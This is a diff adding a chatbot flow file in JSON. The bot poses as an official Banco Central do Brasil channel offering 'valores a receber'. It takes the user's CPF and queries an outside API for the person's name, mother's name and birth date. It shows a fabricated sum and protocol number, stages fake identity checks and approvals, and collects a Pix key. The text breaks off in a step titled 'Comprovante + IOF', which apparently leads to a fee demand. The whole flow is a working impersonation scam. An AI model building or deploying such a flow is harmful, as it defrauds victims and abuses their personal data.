@@ -1,0 +1,2002 @@
+{
+  "version": "6",
+  "events": [
+    {
+      "id": "jlwkp6odq7tnp5en0hl3qc3d",
+      "outgoingEdgeId": "ha41ovdtv4o121u1pfmt77yv",
+      "graphCoordinates": {
+        "x": -250,
+        "y": 0
+      },
+      "type": "start"
+    }
+  ],
+  "groups": [
+    {
+      "id": "xg7vr2i0b6r6tqs9q2eyw9ox",
+      "title": "Abertura",
+      "graphCoordinates": {
+        "x": 0,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "sbfuegl85b7zl6kh12t8kib6",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "mxp7ibwojl",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Esse é um canal oficial do BANCO CENTRAL DO BRASIL, seus dados estão seguros",
+                    "bold": true
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "d1mcpqrppwl5us8w0ikmcduk",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "orsqucf67f3518vgmmcnf2nk",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "prwkuw3v2i",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Digite somente os "
+                  },
+                  {
+                    "text": "números",
+                    "bold": true
+                  },
+                  {
+                    "text": " do seu "
+                  },
+                  {
+                    "text": "CPF",
+                    "bold": true
+                  },
+                  {
+                    "text": ", sem traços ou pontos, para "
+                  },
+                  {
+                    "text": "consultar seus valores",
+                    "bold": true
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "nj3xu8id8mae5rrxxtpve3r4",
+          "type": "text input",
+          "options": {
+            "labels": {
+              "placeholder": "Digite seu CPF",
+              "button": "Enviar"
+            },
+            "variableId": "vlq8kcz9dl8v63we7psxmozrp",
+            "attachments": {
+              "isEnabled": false
+            }
+          },
+          "outgoingEdgeId": "uwu42c2xu2sv49xwnpoe188l"
+        }
+      ]
+    },
+    {
+      "id": "0i3k95tb3vxau2hdez1tu0sr",
+      "title": "Consulta CPF",
+      "graphCoordinates": {
+        "x": 350,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "le5ubzbqyzcmgoo8bekgxevt",
+          "type": "Webhook",
+          "options": {
+            "responseVariableMapping": [
+              {
+                "id": "qtj7c9p3kir89ocg7djbflc9",
+                "variableId": "vee4yzo0z582cwghirpqw5hlr",
+                "bodyPath": "response.data.data.nome"
+              },
+              {
+                "id": "24zs1kedx2jixwpsmhlkg5qv",
+                "variableId": "vawe5x1fwu3yvo7zcrrzmz6zo",
+                "bodyPath": "response.data.data.nome_mae"
+              },
+              {
+                "id": "bnb5w243f0gdye7pi9mfmcun",
+                "variableId": "vs1qyfia3goy6hh4i4ar2rgy2",
+                "bodyPath": "response.data.data.data_nascimento"
+              }
+            ],
+            "webhook": {
+              "headers": [],
+              "method": "GET",
+              "url": "https://meubeneficiosbs.tiectu.easypanel.host/api/api.php?cpf={{cpf}}"
+            }
+          }
+        },
+        {
+          "id": "igxehl51d8whoed8flghdi2h",
+          "type": "Condition",
+          "items": [
+            {
+              "id": "jxibvn760435yslt89kqwv4m",
+              "content": {
+                "comparisons": [
+                  {
+                    "id": "0rz3y3n6acdg1nh7v6wn66p4",
+                    "variableId": "vee4yzo0z582cwghirpqw5hlr",
+                    "comparisonOperator": "Is empty"
+                  }
+                ]
+              },
+              "outgoingEdgeId": "0end3m7bznskzvr34429qd80"
+            }
+          ],
+          "outgoingEdgeId": "jomah3z3krag30d0w5us8ggp"
+        }
+      ]
+    },
+    {
+      "id": "hs93x7j1s49o98xoxaiaz4qu",
+      "title": "CPF nao encontrado",
+      "graphCoordinates": {
+        "x": 350,
+        "y": 300
+      },
+      "blocks": [
+        {
+          "id": "bwa1rp0o29epd0b2r75vlcks",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "0aiie2yhdd",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "❌ Não localizamos os dados desse CPF."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "zopzxh4llb0hayzg3ne5n2wy",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "wv6tyigdlb",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Digite novamente somente os números do seu CPF."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "yzmu4k16fu9vq8incxigu8bw",
+          "type": "text input",
+          "options": {
+            "labels": {
+              "placeholder": "Digite seu CPF",
+              "button": "Enviar"
+            },
+            "variableId": "vlq8kcz9dl8v63we7psxmozrp",
+            "attachments": {
+              "isEnabled": false
+            }
+          },
+          "outgoingEdgeId": "07t4kz6vmj9i2dxay1of45d9"
+        }
+      ]
+    },
+    {
+      "id": "1uyczaqktq5rastzcs6ji62h",
+      "title": "Boas-vindas",
+      "graphCoordinates": {
+        "x": 700,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "j0qs0k4xlu0f8ia8tqkqu48u",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vhwzvcuhland7x8h2kvyqofks",
+            "expressionToEvaluate": "return String(Math.floor(Math.random() * 9e15) + 1e15);",
+            "isCode": true
+          }
+        },
+        {
+          "id": "6ayk79fgvafwea103y5n5z8a",
+          "type": "Set variable",
+          "options": {
+            "variableId": "v3umur1o2yth6vgg6be4wswgj",
+            "expressionToEvaluate": "R$ 7.950,20",
+            "isCode": false
+          }
+        },
+        {
+          "id": "cpn5brmpr4pueyur901zotjk",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "vlhz6ejper",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Olá {{nome}}!"
+                  }
+                ]
+              },
+              {
+                "id": "vbttr4pvqs",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Bem-vindo ao setor de atendimento responsável pelos valores a receber."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "baskckpgrl8paoe3cj6klr0v",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "y3ztkftfky2yfmjj9jk9ol0b",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "6wpq9ux1hz",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "O número do PROTOCOLO deste atendimento é: {{protocolo}}"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "lucy74rtfqscvygrytgoxsq6",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "kov67zufecz26gliulb20chw",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "ashc88etfj",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Você está a um passo de receber seu valor de "
+                  },
+                  {
+                    "text": "{{valor}}",
+                    "bold": true
+                  },
+                  {
+                    "text": "!"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "ow204j2q18mnl0ieuzbwx4ta",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "icb5bkb80nr50t2e8274s7b5",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "me1d0e62ke",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Responda as perguntas a seguir para a aprovação do seu valor."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "r1d2922lb987rjpjumtdhfu0",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          },
+          "outgoingEdgeId": "05a2mfhcn27q2q4z86ddh3t1"
+        }
+      ]
+    },
+    {
+      "id": "fryrwz93dya0j0cc7397gbhw",
+      "title": "Pergunta - nome da mae",
+      "graphCoordinates": {
+        "x": 1050,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "9gzavqvz2z98zu61tctni5nk",
+          "type": "Set variable",
+          "options": {
+            "variableId": "v1hof9uddvzduupfzsm06ft56",
+            "expressionToEvaluate": "return Math.floor(Math.random() * 4) + 1;",
+            "isCode": true
+          }
+        },
+        {
+          "id": "du730bgy5nlsdi8lyofaduio",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vn9iul5s5o0xxkhuijk7n3mnj",
+            "expressionToEvaluate": "const real = String({{mae}} || '').trim();\nif (!real) return \"Maria Aparecida da Silva\";\nreturn Number({{posMae}}) === 1 ? real : \"Maria Aparecida da Silva\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "txr282e7c8yf6at5uuisdbgq",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vffw8zm1ha6ewk4iq00qvwyab",
+            "expressionToEvaluate": "const real = String({{mae}} || '').trim();\nif (!real) return \"Antonia Ferreira Souza\";\nreturn Number({{posMae}}) === 2 ? real : \"Antonia Ferreira Souza\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "z4eoae55us50awxb77el6mtm",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vtaeih2dand4hjciv0nb9az8y",
+            "expressionToEvaluate": "const real = String({{mae}} || '').trim();\nif (!real) return \"Teresa Gomes de Oliveira\";\nreturn Number({{posMae}}) === 3 ? real : \"Teresa Gomes de Oliveira\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "vjbldfzj99fnnglfqmmifhrq",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vwmt58mi0rpp90ahi8zyf056f",
+            "expressionToEvaluate": "const real = String({{mae}} || '').trim();\nif (!real) return \"Rosa Maria dos Santos\";\nreturn Number({{posMae}}) === 4 ? real : \"Rosa Maria dos Santos\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "7sk96t8cvfkyo3y1rd9j0jtk",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "f36z8ci32d",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Qual nome da sua mãe?"
+                  }
+                ]
+              },
+              {
+                "id": "u8krxc8vca",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Escolha a alternativa correta."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "5hfkzph9i3nzs434ti0jh1hv",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "b54n68g4irlfh0jum6uas8uy",
+              "content": "{{altMae1}}"
+            },
+            {
+              "id": "gzvvb7fqtobnfur5xlxt3j2a",
+              "content": "{{altMae2}}"
+            },
+            {
+              "id": "mzeet1a4qbnjqjaa9ogp3qz6",
+              "content": "{{altMae3}}"
+            },
+            {
+              "id": "4qbkw0jwscqgspkmqulaof1h",
+              "content": "{{altMae4}}"
+            },
+            {
+              "id": "6je36g90gc502go9cp8p1ea6",
+              "content": "Nenhuma das alternativas."
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "vvfyc1h38wmzw74i6tdwxpvhw"
+          }
+        },
+        {
+          "id": "dy5rglb2h59b8eey6abi4p0e",
+          "type": "Condition",
+          "items": [
+            {
+              "id": "fyty4g8bq5es7o91n8b16sti",
+              "content": {
+                "comparisons": [
+                  {
+                    "id": "eftk9ot9rvyxbqyepq5qssjv",
+                    "variableId": "vvfyc1h38wmzw74i6tdwxpvhw",
+                    "comparisonOperator": "Not equal",
+                    "value": "{{mae}}"
+                  }
+                ]
+              },
+              "outgoingEdgeId": "pp2y87m365gzlhi2tcxjzo0i"
+            }
+          ],
+          "outgoingEdgeId": "nrcotq7p0zexpvknaqun5e14"
+        }
+      ]
+    },
+    {
+      "id": "43mgnchyk5pe3qxtpbi6wbm9",
+      "title": "Mae incorreta",
+      "graphCoordinates": {
+        "x": 1050,
+        "y": 350
+      },
+      "blocks": [
+        {
+          "id": "3akim5y5hpp3hlya5wzbeyn5",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "7nu17qy0b7",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Resposta incorreta! Tente novamente."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "nfmp6ra5bobw2wuebnzlkdgl",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          },
+          "outgoingEdgeId": "f6e1h2pu3vvnadtld2w932g1"
+        }
+      ]
+    },
+    {
+      "id": "mfkmkasbm1qzut70s5w6tm06",
+      "title": "Pergunta - data de nascimento",
+      "graphCoordinates": {
+        "x": 1400,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "xr86h8slsfimj47ndch6orhq",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "fjm69mpfvq",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Resposta Correta! ✅"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "idb3tgrvq4k5anzrhhyzbstp",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          }
+        },
+        {
+          "id": "ttsil9j5cwih0ay2768irwkg",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vfdwf4guz0k4m9l5xrckhzazl",
+            "expressionToEvaluate": "return Math.floor(Math.random() * 4) + 1;",
+            "isCode": true
+          }
+        },
+        {
+          "id": "r9o0006ivddenk1ue2fb84x1",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vys5az3cb9mylhqeiev0zb2ym",
+            "expressionToEvaluate": "const real = String({{nasc}} || '').trim();\nif (!real) return \"19/05/1996\";\nreturn Number({{posNasc}}) === 1 ? real : \"19/05/1996\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "nwgbkhsyvyls1t19h3uzxwg9",
+          "type": "Set variable",
+          "options": {
+            "variableId": "v0ahhhiar1j753mgtzoz6jtca",
+            "expressionToEvaluate": "const real = String({{nasc}} || '').trim();\nif (!real) return \"02/11/2001\";\nreturn Number({{posNasc}}) === 2 ? real : \"02/11/2001\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "gb351cmv9dsnr21qwj4ldy65",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vwu3y5s9gi5t9yrzftzjmoiiu",
+            "expressionToEvaluate": "const real = String({{nasc}} || '').trim();\nif (!real) return \"25/02/1982\";\nreturn Number({{posNasc}}) === 3 ? real : \"25/02/1982\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "tofnvh9utf1fvay30qbb8k19",
+          "type": "Set variable",
+          "options": {
+            "variableId": "vlzcmci98xojkb974xe4xysph",
+            "expressionToEvaluate": "const real = String({{nasc}} || '').trim();\nif (!real) return \"11/09/1978\";\nreturn Number({{posNasc}}) === 4 ? real : \"11/09/1978\";",
+            "isCode": true
+          }
+        },
+        {
+          "id": "1zrremz2qq9zg36kcvbr96iv",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "wq4axp1u1w",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Qual sua data de nascimento?"
+                  }
+                ]
+              },
+              {
+                "id": "789h5c11mh",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Escolha a alternativa correta."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "fl674lmsbblbj2ovi94ktd4l",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "upl93xllio18ife0o7vsho28",
+              "content": "{{altNasc1}}"
+            },
+            {
+              "id": "crfklrwl1n9gcem6lkyhwpak",
+              "content": "{{altNasc2}}"
+            },
+            {
+              "id": "kcei5d7znkgh2bseqlh0zcso",
+              "content": "{{altNasc3}}"
+            },
+            {
+              "id": "5mgtikh7tuqwqa9vh4a2kdlv",
+              "content": "{{altNasc4}}"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "vp8becduyfxqavv9aa4c418i3"
+          }
+        },
+        {
+          "id": "ybvzv7tgupazax6lyt4i74r8",
+          "type": "Condition",
+          "items": [
+            {
+              "id": "wk0okv3xdm48pcsx5o7pa48q",
+              "content": {
+                "comparisons": [
+                  {
+                    "id": "7gg3i4t2ztxtjwgcq1ya5yqs",
+                    "variableId": "vp8becduyfxqavv9aa4c418i3",
+                    "comparisonOperator": "Not equal",
+                    "value": "{{nasc}}"
+                  }
+                ]
+              },
+              "outgoingEdgeId": "q7tqei32q8hdllr391jkr549"
+            }
+          ],
+          "outgoingEdgeId": "3ujxw26gihdl0zqbcxzba82g"
+        }
+      ]
+    },
+    {
+      "id": "rsqofbq0kkm4bdy83sz8obk1",
+      "title": "Nascimento incorreto",
+      "graphCoordinates": {
+        "x": 1400,
+        "y": 350
+      },
+      "blocks": [
+        {
+          "id": "g3z067zzm0msdynfo8h9i07n",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "aaxvaa397m",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Resposta incorreta! Tente novamente."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "x0rdyxsr464u7m2wvgjq8dfi",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          },
+          "outgoingEdgeId": "ul1im3te9zvgqip1gf3s91d1"
+        }
+      ]
+    },
+    {
+      "id": "0qaj1vzddiuhr5vslkgmpkpa",
+      "title": "Identidade confirmada",
+      "graphCoordinates": {
+        "x": 1750,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "vugji74098t54ox4j6pi9mlt",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "uzg971g7i8",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Resposta Correta! ✅"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "2ewvwsl7ql5m26dacnztvv6n",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "le4maq01bv3yplu3fugc76jz",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "wfa3o9rn8z",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Identidade Confirmada com sucesso!",
+                    "bold": true
+                  }
+                ]
+              },
+              {
+                "id": "1kgwyjbj7r",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Nome: {{nome}}"
+                  }
+                ]
+              },
+              {
+                "id": "wxtdocvh4r",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "CPF: {{cpf}}"
+                  }
+                ]
+              },
+              {
+                "id": "218v339jxc",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Data de Nascimento: {{nasc}}"
+                  }
+                ]
+              },
+              {
+                "id": "ebzghss9o8",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Nome da mãe: {{mae}}"
+                  }
+                ]
+              },
+              {
+                "id": "2y5oj5fbtb",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Valor disponível: "
+                  },
+                  {
+                    "text": "{{valor}}",
+                    "bold": true
+                  }
+                ]
+              },
+              {
+                "id": "pxv0wvieyg",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Status: ☑️ Pre-aprovado"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "fjwc0bdi7e2ti4qtydr4gtw8",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "ewcc53qzvtde65qauc3tewk3",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "qzhyr2q28s",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Deseja receber o seu valor agora?"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "hr4hwifrk2w60iqyryta5lxr",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "tbeirypjg20m62s3yob67zsl",
+              "content": "SIM, DESEJO RECEBER"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "v7gajyj277rpjaf1g6i32nl6v"
+          },
+          "outgoingEdgeId": "1qzrkq1q8e4xejz7d6uyjxpr"
+        }
+      ]
+    },
+    {
+      "id": "2fm7jjs068ctjro6bt5qj343",
+      "title": "Forma de recebimento",
+      "graphCoordinates": {
+        "x": 2100,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "9d2hck9ojs3cnq5jxv68oac6",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "hfemotywgd",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Solicitando aprovação..."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "6xf5deok2bkd0mpytnzrf3l9",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "gw9lqmraa90ooxskb9b3yrd8",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "vaf40b326m",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "✅ Solicitação aprovada!"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "g9womwjdxq3b96mbprop0wtq",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          }
+        },
+        {
+          "id": "0wkh0e4dfedwmmrmzrwtm4nu",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "k8g0djw85w",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Qual forma de recebimento você deseja?"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "so3kwqqsgv2v0otzushj3qn0",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "7c52hhnmvg9cftkxd1s1s68e",
+              "content": "RECEBER VIA-PIX"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "v7gajyj277rpjaf1g6i32nl6v"
+          }
+        },
+        {
+          "id": "klpjxxdvgqwtg0q5mhb0b74p",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "1"
+          }
+        },
+        {
+          "id": "ar656s4fdcjnob8rtp3gf4ru",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "cs9iuivt8g",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Qual tipo de chave pix você deseja receber?"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "hwq96brp2fsze5i0xmpbaq2x",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "uaaa2z9crguqjn375nq3cdug",
+              "content": "CPF"
+            },
+            {
+              "id": "l8zksl6wm2ecy4sdq1exga40",
+              "content": "Telefone"
+            },
+            {
+              "id": "74u1tmdhu6t2r2djpj7ayflh",
+              "content": "E-mail"
+            },
+            {
+              "id": "2mo0gl2no3z11ah115cq764i",
+              "content": "Chave aleatória"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "vwiopadelxzocye0uefrduu2g"
+          },
+          "outgoingEdgeId": "ehh0rhcsc6s2836c7brfzrsp"
+        }
+      ]
+    },
+    {
+      "id": "dny6n9px4yuksmvomiaby2yy",
+      "title": "Chave PIX",
+      "graphCoordinates": {
+        "x": 2450,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "u8rbz7hmsvvn905ob1wvoskr",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "qxqonptqwy",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "A seguir, digite cuidadosamente a chave Pix {{tipoChave}} que você deseja para efetivar seu saque."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "njo82yso4een37ap36h389go",
+          "type": "text input",
+          "options": {
+            "labels": {
+              "placeholder": "Digite sua chave Pix...",
+              "button": "Enviar"
+            },
+            "variableId": "vmy3uv4gnmqzl53hvea5aypvd",
+            "attachments": {
+              "isEnabled": false
+            }
+          },
+          "outgoingEdgeId": "kjcc346nmgaxs2809mct6etk"
+        }
+      ]
+    },
+    {
+      "id": "h8varxdifqwu6ksuzh6g69lo",
+      "title": "Confirmacao da chave",
+      "graphCoordinates": {
+        "x": 2800,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "5sytnrpmki0tfken1rh2dogw",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "03ohqr7ev7",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Nome: {{nome}}"
+                  }
+                ]
+              },
+              {
+                "id": "7p9hpzfyx6",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Tipo da chave Pix: {{tipoChave}}"
+                  }
+                ]
+              },
+              {
+                "id": "ua2kz8q5iv",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Chave Pix: {{chavePix}}"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "cpqbtvqtlqzc0k9zj93s0tb3",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "2"
+          }
+        },
+        {
+          "id": "udh7zui5isopdymtn8ueseos",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "j4ce8u2tuh",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Transferências PIX são processadas instantaneamente e não podem ser canceladas.",
+                    "bold": true
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "ttp9aneioq65qwncuwrz6mqp",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "fjwl1pi2fbokfjgvjic498ck",
+              "content": "Sim, está correto."
+            },
+            {
+              "id": "ttc2uwx91lo5e8jzldqi22tg",
+              "content": "Não, desejo corrigir."
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "v7gajyj277rpjaf1g6i32nl6v"
+          }
+        },
+        {
+          "id": "x4i2jw271fshdm3c9bgrb1at",
+          "type": "Condition",
+          "items": [
+            {
+              "id": "afzgiw5x3o6qvrlmlptutugw",
+              "content": {
+                "comparisons": [
+                  {
+                    "id": "gbwhpcu122ie7hssggdxb2do",
+                    "variableId": "v7gajyj277rpjaf1g6i32nl6v",
+                    "comparisonOperator": "Equal to",
+                    "value": "Não, desejo corrigir."
+                  }
+                ]
+              },
+              "outgoingEdgeId": "767hb2s2smjsfzic5keqaely"
+            }
+          ],
+          "outgoingEdgeId": "sycqnfstsar6hz4r10cjap37"
+        }
+      ]
+    },
+    {
+      "id": "4o0ekkuesze8oj1y7k8ayfs7",
+      "title": "Saque aprovado",
+      "graphCoordinates": {
+        "x": 3150,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "ido1239flrge9o37xt0otwyz",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "n3184vayg2",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Aguarde um momento..."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "wnks9l11hdn400k7zpaq58dx",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "io1v46e6fg2d07zevtgoxk01",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "artjizho8g",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Parabéns, {{nome}}, a solicitação de saque do seu valor foi aprovada com sucesso para a chave Pix cadastrada."
+                  }
+                ]
+              },
+              {
+                "id": "0gty2la68h",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "✅ Valor: {{valor}}"
+                  }
+                ]
+              },
+              {
+                "id": "ihlqrixpc6",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "✅ Tipo da chave Pix: {{tipoChave}}"
+                  }
+                ]
+              },
+              {
+                "id": "k6p5ylei16",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "✅ Chave Pix: {{chavePix}}"
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "u3xddpv2okrqwhe73kf6cxi0",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "vxmnv3i1pdy8g5u6zolbso55",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "zh09ckkn8s",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Clique no botão abaixo para confirmar seu saque e gerar o comprovante de recebimento."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "rihbvqdxcul3qs50ijk75c0u",
+          "type": "choice input",
+          "items": [
+            {
+              "id": "f5hkcapz8uy9pszqm2o49r9x",
+              "content": "CONFIRMAR"
+            }
+          ],
+          "options": {
+            "isMultipleChoice": false,
+            "isSearchable": false,
+            "variableId": "v7gajyj277rpjaf1g6i32nl6v"
+          },
+          "outgoingEdgeId": "eu7fjppxdlomg8ypl9xu78r6"
+        }
+      ]
+    },
+    {
+      "id": "jdh3gqlbic12jjt59lvk0zex",
+      "title": "Comprovante + IOF",
+      "graphCoordinates": {
+        "x": 3500,
+        "y": 0
+      },
+      "blocks": [
+        {
+          "id": "wd1rk1ef0ol34c529fv77zib",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "43qoo43k5q",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "Gerando seu comprovante..."
+                  }
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "a0ounc4fu5byjjffkb9pnqzx",
+          "type": "Wait",
+          "options": {
+            "secondsToWaitFor": "3"
+          }
+        },
+        {
+          "id": "ec7zko8be6czxwdeo40oeqos",
+          "type": "text",
+          "content": {
+            "type": "richText",
+            "richText": [
+              {
+                "id": "xaypvhco7k",
+                "type": "p",
+                "children": [
+                  {
+                    "text": "✅ Comprovante Gerado",
